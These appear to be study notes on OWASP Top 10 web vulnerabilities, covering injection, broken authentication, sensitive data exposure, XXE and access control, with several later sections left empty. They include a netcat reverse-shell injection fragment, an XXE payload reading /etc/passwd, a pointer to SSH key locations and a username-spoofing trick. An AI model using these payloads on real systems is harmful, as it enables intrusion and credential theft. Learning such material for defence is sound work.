- ## Injection
	- Exploited when user controlled input is interpreted as actual commands or parameters by the application.
	- **Types:**
		- *SQL Injection (SQLi):*
			- Input passed to SQL queries.
		- Command Injection:
			- Input passed to system commands.
			- When server-side code like PHP in a web application makes a system call on the hosting machine.
			- Attacker could execute operating system commands on the server.
			- Open a reverse shell to become the user that the web server is running as.
			- For example `;nc -e /bin/bash`.
			- *Blind Command Injection:*
				- When the system command to the server doesn't return the response to the user in the HTML document.
			- *Active Command Injection:*
				- Return the response to the user.
	- **Remediation:**
		- Use an allow list where the user input is compared to a list of safe input characters, if not safe then it is rejected and the application throws an error.
		- Stripping input where the dangerous characters are removed before the input is processed.
- ## Broken Authentication
	- Allow access to other users' accounts which would allow the attacker to access sensitive data.
	- **Types:**
		- Brute-force attacks.
		- Use of weak credentials.
		- Weak session cookies.
	- **Mitigation:**
		- Enforce strong password policies.
		- Enforce automatic lockout after a certain number of attempts.
		- Implement Multi Factor Authentication.
	- **Example:**
		- User input without sanitization, a user named "admin" exists on an application.
		- We want to access that account, a possible exploit would be to re-register that username but with a slight modification.
		- Use the username ` admin` (space at the beginning), fill any required inputs and submit.
		- The new user if created will have the same right as the normal admin.
		- The new user will also be able to see all the content presented under the user `admin`.
- ## Sensitive Data Exposure
	- When a web application divulges sensitive data.
	- Often involves techniques such as Man in The Middle (MITM), where the attacker force user connections through a device which he controls, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information.
	- Data is most probably located in a database, whether its a MySQL database or a NoSQL database which all run on a dedicated server.
	- Databases can also be stored in files, these databases are called `flat-file`, which is much easier than setting up a full database server, used for small web applications.
		- These files could be located under that `root` directory of the website.
		- The simplest format of flat-file database is `sqlite` database, which can be interacted with in most programming languages, and have a client for querying them, on Kali is called `sqlite3`.
		- Check file using `file example.db`.
		- Access the database using `sqlite3 <database-name>`.
		- Check tables using `.tables`.
		- Check table information using `PRAGMA table_info(<table-name>)`.
		- Use any `SQL` query needed.
- ## XML External Entity (XXE)
	- A vulnerability that abuses features of XML parser/data.
	- Often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system.
	- Can also cause a DoS attack or perform SSRF inducing the web application to make requests to other applications.
	- Can enable port scanning and lead to remote code execution.
	- **Types:**
		- *In-band XXE:*
			- Attacker can receive an immediate response to the XXE payload.
		- *Out-band/blind XXE:*
			- No immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.
	- **What is XML:**
		- XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.
		- Used for storing and transporting data.
		- Platform-independent and programming language independent.
		- Data stored and transported using XML can be changed at any point in time without affecting the data presentation.
		- XML allows validation using DTD (Document Type Definitions) and Schema, this validation insures that the XML document is free from any syntax error.
		- Simplifies data sharing between various systems because of its platform-independent nature. XML data doesn't require any conversion when transferred between different systems.
		- XML is case sensitive.
		- **Components:**
			- Starts with a XML Prolog. `<?xml version="1.0" encoding="UTF-8"?>`.
			- Must contain a root element, for example:
				- `<?xml version="1.0" encoding="UTF-8"?>`
				  `<mail>` <--- Root element
					`<to>falcon</to>`
					`<from>feast</from>`
					`<subject>About XXE</subject>`
					`<text>Teach about XXE</text>`
				  `</mail>`
		- **DTD (Document Type Definition):**
			- Defines the structure and the legal elements and attributes of an XML document.
			- Used to validate the information of an XML document against the defined rules.
		- **Payload examples:**
			- Simple payload:
				 `<!DOCTYPE replace [<!ENTITY name "feast"> ]>`
				 `<userInfo>`
					 `<firstName>falcon</firstName>`
					 `<lastName>&name;</lastName>`
				 `</userInfo>`
				 - Defining an Entity called `name` and assigning it a value of `feast`, and later, used that entity in the code.
			- Payload to read some file:
				`<?xml version="1.0"?>`
				`<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>`
				`<root>&read;</root>`
		- **NOTE:** Common location for `ssh` keys is `/home/<user>/.ssh/id_rsa`.
- ## Broken Access Control
	- Regular visitor accessing protected pages that should only be accessible to admins.
	- Leads to accessing unauthorized functionality and being able to view sensitive information.
	- **Examples:**
		- The application uses unverified data in a SQL call that is accessing account information.
			 `pstmt.setString(1, request.getParameter("acct"));`
			 `ResultSet results = pstmt.executeQuery();`
			 - An attacker can simply modify the `acct` parameter in the browser to send whatever account number they want.
		-  An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
			 `http://example.com/app/getappinfo`
			 `http://example.com/app/admin_getappinfo`
			- If an unauthorized user can access either page, it's a flaw.
	- **IDOR (Insecure Direct Object Reference):**
		- The act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.
- ## Security Misconfiguration
- ## Cross-site Scripting
- ## Insecure Deserialization
- ## Components with Known Vulnerabilities
- ## Insufficient Logging and Monitoring
